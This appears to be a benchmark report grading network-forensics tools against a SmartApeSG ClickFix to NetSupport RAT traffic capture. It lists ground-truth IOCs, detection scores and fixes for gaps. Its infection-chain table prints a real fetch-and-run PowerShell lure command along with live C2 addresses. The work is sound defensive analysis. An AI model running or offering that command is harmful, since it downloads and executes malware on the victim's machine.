# Benchmark: 2026-05-22 SmartApeSG ClickFix → Unidentified RAT → NetSupport RAT

**Source:** https://www.malware-traffic-analysis.net/2026/05/22/index.html  
**PCAP:** `malware_data/2026-05-22-SmartApeSG-activity.pcap`  
**Notes/IOCs:** `malware_data/2026-05-22-notes-from-SmartApeSG-activity.txt`  
**Malware files:** `malware_data/2026-05-22-files-from-SmartApeSG-activity/`  
**OS:** Windows 10 (Edge browser)  
**Victim IP:** `10.5.22.101`  
**Capture duration:** 24m 33s | 51,200 packets | 60MB

---

## Infection Chain (Ground Truth)

| Stage | URL / IP | Description |
|-------|----------|-------------|
| 1 | `https://nhanhoa.org/` | Legitimate WordPress site compromised by SmartApeSG |
| 2a | `https://thunderplanethub.top/role/beta-cookie.js` | SmartApeSG obfuscated JS injected into page |
| 2b | `https://thunderplanethub.top/role/rate-hook?qoy9s6xM` | SmartApeSG traffic redirect JS |
| 2c | `https://thunderplanethub.top/role/principal-validator.js?18b1fba915dcc6a6` | SmartApeSG CAPTCHA page (1.7MB ClickFix handler) |
| 3 | ClickFix prompt: `powershell -c iex(irm 178.156.199.54 -UseBasicParsing)` | User copies and runs PowerShell |
| 4 | `http://178.156.199.54/` | Stage-1 PS script: fetches stage-2 from `5.161.235.47` |
| 5 | `http://5.161.235.47/` | Stage-2 PS script: downloads ZIP from `northernbridgeworks.com/more` |
| 6 | `https://northernbridgeworks.com/more` | Downloads `RateLimit.zip` (33MB) — contains malware |
| 7 | `tcp://89.110.110.119:443` | Unidentified RAT C2 — TLS over non-standard TCP stream |
| 8 | `http://194.180.191.223:443/` | NetSupport RAT C2 — attempted but **no response** |
| 9 | `http://geo.netsupportsoftware.com/location/loca.asp` | NetSupport geo-lookup beacon |

---

## Tool Results vs Ground Truth

### `extract_iocs`

| IOC | Ground Truth | Detected? | Tool Output |
|-----|-------------|-----------|-------------|
| `thunderplanethub.top` | SmartApeSG domain | ✅ | DNS flag `SUSPICIOUS suspicious_tld`, TLS SNI |
| `northernbridgeworks.com` | Payload host | ✅ | DNS flag `SUSPICIOUS`, TLS SNI |
| `geo.netsupportsoftware.com` | NetSupport beacon | ✅ | DNS flag `SUSPICIOUS` |
| `nhanhoa.org` | Compromised site | ❌ | DNS query not in capture (cached); no HTTP (HTTPS-only) |
| `178.156.199.54` | Stage-1 C2 | ✅ | `BARE_IP_HOST | SUSPICIOUS_UA`, payload decoded |
| `5.161.235.47` | Stage-2 C2 | ✅ | `BARE_IP_HOST | SUSPICIOUS_UA`, payload decoded |
| `89.110.110.119:443` | Unidentified RAT C2 | ✅ | C2-443 (88 non-TLS payload pkts) |
| `194.180.191.223:443` | NetSupport C2 (down) | ❌ | `tcp.len>0` filter excludes SYN-only attempts to unreachable servers |
| PowerShell IOCs | `Invoke-Expression`, `Invoke-WebRequest` | ✅ | PAYLOAD section decoded both scripts |
| `5.78.196.236` → `thunderplanethub.top` | SmartApeSG server | ✅ | TLS `SUSPICIOUS_DOMAIN` |
| `5.78.196.180` → `northernbridgeworks.com` | ZIP server | ✅ | TLS `SUSPICIOUS_DOMAIN` |

**DNS score: 3/3 flagged**  
**C2 IP score: 3/4** — `194.180.191.223` missed (SYN-only, server never responded)  
**Payload decode: 2/2** — both PowerShell scripts decoded with embedded IOCs

#### C2-443 false positives (18 IPs flagged, mostly Microsoft)
After `tcp.len>0` fix, IPs with non-TLS payload on :443:
- `48.192.143.121` → `tas01.cwsapp.update.microsoft.com` ❌ FP (Windows Update)
- `135.233.95.135` → `tas02.cws.update.microsoft.com` ❌ FP (Windows Update)
- `132.196.74.210` → `fe2cr.update.microsoft.com` ❌ FP (Windows Update)
- `23.219.89.34` → `www.bing.com` ❌ FP (Bing)
- `89.110.110.119` → confirmed RAT C2 ✅
- Several others with low counts (2–5 pkts) that are likely MS365/Windows telemetry

**Root cause:** Microsoft Windows services sometimes have TCP payload packets that tshark can't decode as TLS, particularly during TLS resumption or Windows-specific TLS extensions. Needs `.windowsupdate.com` and `.update.microsoft.com` resolved IPs excluded.

---

### `find_downloads`

| File | Expected | Detected? | Notes |
|------|----------|-----------|-------|
| Stage-1 PS script from `178.156.199.54` | Yes | ✅ | HTTP, `text/plain`, `SUSPICIOUS_UA` |
| Stage-2 PS script from `5.161.235.47` | Yes | ✅ | HTTP, `text/plain`, `SUSPICIOUS_UA` |
| `RateLimit.zip` (33MB) from `northernbridgeworks.com` | Yes | ✅ | HTTPS estimate, 33MB, `NON_WHITELISTED_DOMAIN` |
| RAT communication from `89.110.110.119` | Yes | ✅ | HTTPS estimate, 17MB (inbound RAT traffic) |
| Chrome `.crx` extension | Collateral | ✅ | NOTABLE — HeadlessChrome auto-installs extension |

**Score: 4/4 critical downloads detected**

The `RateLimit.zip` was only visible as an HTTPS estimate (no HTTP headers since TLS-encrypted). The tool correctly flagged it as suspicious via SNI (`northernbridgeworks.com` not whitelisted).

---

### `c2_beaconing` (target: `89.110.110.119`)

- **52 bursts** detected over 20m 44s
- **Mean interval: 12.9s / Median: 7.0s**
- Regular `7s / 20s` alternating keep-alive pattern (3-phase RAT beacon: check-in → task poll → data)
- Verdict: LOW CONFIDENCE / HUMAN due to high jitter (CV=0.9) — tool conservative by design
- **Human assessment:** The 7s and 20s alternating intervals are a classic RAT heartbeat pattern; the irregularity is normal for task-based C2 communication

**Gap:** Beaconing verdict is too conservative for RAT traffic with known alternating intervals. Multi-interval detection (bimodal distribution) would improve confidence.

---

### `http_sessions`

| Session | Detected? | Notes |
|---------|-----------|-------|
| `178.156.199.54` | ✅ | `Apache/2.4.58 (Ubuntu)`, PowerShell UA, `BARE_IP_HOST | SUSPICIOUS_UA` |
| `5.161.235.47` | ✅ | `Apache/2.4.58 (Ubuntu)`, PowerShell UA, `BARE_IP_HOST | SUSPICIOUS_UA` |
| `geo.netsupportsoftware.com` | ✅ | Cloudflare, `/location/loca.asp` |

Both ClickFix delivery servers were identified as running the same Apache version on Ubuntu — strong correlation indicator.

---

### `extract_credentials` — No credential material found (expected, none in this infection)

### `detect_dns_tunneling` — No tunneling detected (correct, none in this infection)

---

## Gaps and Improvements Found

### Gap 1: SYN-only offline C2 detection
`194.180.191.223:443` had 60 SYN packets but no server response. Our `tcp.len>0` fix correctly excluded it from the "active non-TLS C2" list, but it became completely invisible. Need a dedicated check for IPs receiving many SYN packets with zero successful connections.

**Fix needed:** Add "SYN-storm to :443 — server unreachable" detection to `extract_iocs` (a separate pass counting `tcp.dstport==443 && tcp.flags.syn==1 && tcp.flags.ack==0`). If count ≥ threshold and no TLS established → flag as `C2_UNREACHABLE`.

### Gap 2: Microsoft Windows Update IPs in C2-443
Many Microsoft Windows Update service IPs (`*.update.microsoft.com`, `*.cwsapp.update.microsoft.com`) appear as C2-443 false positives because their TLS sessions produce some non-TLS TCP payload packets. Need SNI-based exclusion: after building C2-443 list, cross-reference IPs that have a benign-domain SNI in any TLS session and remove them.

**Fix needed:** In `iocs.py`, after the C2-443 pass, run a second lookup of `(ip.dst, tls.handshake.extensions_server_name)` and subtract IPs that map exclusively to benign SNIs.

### Gap 3: HeadlessChrome user agent not flagged
NetSupport RAT uses embedded Chromium / HeadlessChrome for its C2 communication. The UA `HeadlessChrome/148.x` is not in `_SUSPICIOUS_UA_RE`. While HeadlessChrome is legitimate for testing tools, its presence in a malware infection context (combined with downloading `.crx` extensions) is notable.

**Fix:** Add `headlesschrome` as a NOTABLE (not critical) pattern to `_SUSPICIOUS_UA_RE`, or as a separate `_NOTABLE_UA_RE` at lower score.

### Gap 4: nhanhoa.org compromised site not flagged
The victim visited `nhanhoa.org` which served malicious JS (SmartApeSG injection). The domain appears only in TLS SNI — no DNS query was visible (either cached or resolved before capture started). The TLS connection was correctly made but `nhanhoa.org` was not flagged because the SNI section filters by `_is_benign_domain()` and `nhanhoa.org` is not whitelisted (so it SHOULD be flagged).

**Investigation needed:** Check why `nhanhoa.org` wasn't in TLS output. Possibly the SNI was observed but score threshold filtered it out.

---

## Overall Performance on This Sample

| Tool | Score | Notes |
|------|-------|-------|
| `extract_iocs` | 8/10 | Missed SYN-only C2, MS Update FPs in C2-443 |
| `find_downloads` | 10/10 | All critical downloads detected |
| `http_sessions` | 10/10 | Both ClickFix servers identified with server fingerprint |
| `c2_beaconing` | 7/10 | Detected correct intervals, verdict too conservative |
| `extract_credentials` | N/A | No creds in this infection |
| `detect_dns_tunneling` | N/A | No tunneling |

**Overall: 87% — Good detection with two known gaps to fix**

---

## Key Takeaways for Project

1. **SmartApeSG fingerprint:** Two-stage PowerShell from bare-IP servers running `Apache/2.4.58 (Ubuntu)` + HTTPS ZIP download from a non-whitelisted domain → reliable detection signature
2. **NetSupport RAT fingerprint:** `geo.netsupportsoftware.com` DNS query + HeadlessChrome UA + TLS to bare-IP on :443
3. **ClickFix delivery fingerprint:** PowerShell UA (`WindowsPowerShell/5.1.x`) doing GET to bare-IP HTTP server → always high-confidence
4. **ZIP download via TLS:** Our HTTPS estimate catches large encrypted downloads even without HTTP headers
5. **Offline C2 servers:** Cannot be detected by packet-content analysis alone — need SYN-count heuristic
